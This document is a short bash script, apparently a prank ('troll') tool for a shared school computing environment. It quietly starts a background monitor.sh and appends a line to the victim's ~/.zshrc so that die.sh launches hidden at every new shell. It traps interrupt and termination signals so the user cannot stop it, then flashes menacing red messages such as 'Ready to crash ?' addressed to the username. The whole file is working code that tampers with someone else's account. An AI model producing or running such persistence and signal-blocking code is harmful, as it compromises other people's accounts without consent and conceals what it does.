#!/bin/bash
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/die.sh" ~/.zshrc 2>/dev/null; then
    cat << EOF >> ~/.zshrc
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/die.sh > /dev/null 2>&1 &!
EOF
fi

FIGLET=/sgoinfre/goinfre/Perso/mochamsa/utils/figlet_temp/usr/bin/figlet-figlet

trap '' SIGINT SIGTSTP SIGQUIT SIGHUP SIGTERM

clear
tput civis

base_messages=(
    "End is near..."
    "Ready to crash ?"
    "Better FF your work..."
    "Black Hole is coming..."
)

username=$(whoami)
selected_base_message="${base_messages[$RANDOM % ${#base_messages[@]}]}"
message="$username, $selected_base_message"

show_message() {
    for ((i=0; i<${#message}; i++)); do
        clear
        
        partial_message="${message:0:$((i+1))}"
        
        digital_text="$($FIGLET -d /sgoinfre/goinfre/Perso/mochamsa/utils/figlet_temp/usr/share/figlet -f digital "$partial_message")"
        
        rows=$(tput lines)
        cols=$(tput cols)
        line_count=$(echo "$digital_text" | wc -l)
        start_line=$(( (rows - line_count) / 2 ))
        
        tput cup $start_line 0
        
        while IFS= read -r line; do
            padding=$(( (cols - ${#line}) / 2 ))
            printf "%*s\x1b[38;2;255;0;0m%s\x1b[0m\n" $padding "" "$line"
        done <<< "$digital_text"
        
        sleep 0.1
    done
    
    sleep 3
}

show_message

clear
tput cnorm
exit 0
